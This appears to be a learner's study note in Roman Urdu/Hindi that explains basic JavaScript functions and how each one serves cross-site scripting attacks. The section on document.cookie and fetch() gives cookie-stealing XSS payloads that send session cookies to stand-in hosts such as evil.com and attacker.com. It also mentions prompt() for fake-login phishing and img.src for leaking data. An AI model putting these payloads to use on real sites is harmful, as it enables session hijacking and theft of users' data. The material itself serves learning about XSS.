JavaScript main agr hum **alert()** use krty hain ky website main XSS execute hoo rha hai ya nhi agr execute hoo rha hua too aik pop up ajaye ga

---

**prompt()** hum kisi command ky sath ius waqt use krty hain jab hamy user sy input chahie hota hai example agr hum likhty hain prompt("Enter your password") too website py aik display hota hai Enter Your Password phir user ius main apna password daaly ga
---

**var** hum taab lagaty hain jab hum user ki value ko apny database main store karna chahty hoon

**let** var aur let dono value store karte hain — lekin let zyada safe hota hai.
---

## Difference Between Var/let

Value store karna

**var**

var name = "Habib";

- Old JavaScript version ka style hai.

- Function-level scope rakhta hai.

**let**

let age = 18;

- New aur modern style hai (ES6+).

- Block-level scope rakhta hai.
---

**document.cookie** — (Cookies churaana)

document.cookie ek JavaScript command hai jo browser se current website ki cookie value nikalta hai.

### ⚠️ XSS mein is kaam ke liye use hota hai:

**var c = document.cookie;
alert(c); // tumhari current session ki cookies dikha dega**

### Agar attacker ka XSS payload chalta hai, toh wo ye kar sakta hai:

**fetch("https://evil.com/steal?cookie=" + document.cookie);**

### 🕵️‍♂️ Matlab: Victim ki session cookie attacker ko chali jaayegi = session hijack
---

**fetch()** — (Data dusri jagah bhejna)

fetch() ka kaam hota hai HTTP request bhejna JavaScript se.

### Example:

**fetch("https://attacker.com/steal?info=hello");**

🧠 Attacker isse user ka input, cookie, ya password apni site pe secretly bhej sakta hai.

### XSS exploit:

**fetch("https://evil.com/log?cookie=" + document.cookie);**
---

### Quick Summary

**alert()**	Popup show karta hai	

XSS main use: XSS payload test karna

**prompt()**	User se input leta hai

XSS main use: Fake login / phishing

**var or let**	Value store karta hai
XSS main use: Cookie ya user data store karna

**if / else** Logic lagana
XSS main use:	Kab kya run ho

**document.cookie**	User ki cookies nikalna
XSS main use:	Session hijack

**fetch()** Data dusri site pe bhejna
XSS main use: Data leak (exfiltrate)

**img.src** 	Image ke zariye request bhejna	
XSS main use: Alternate data leak meth

if else bhi 100% samj agya


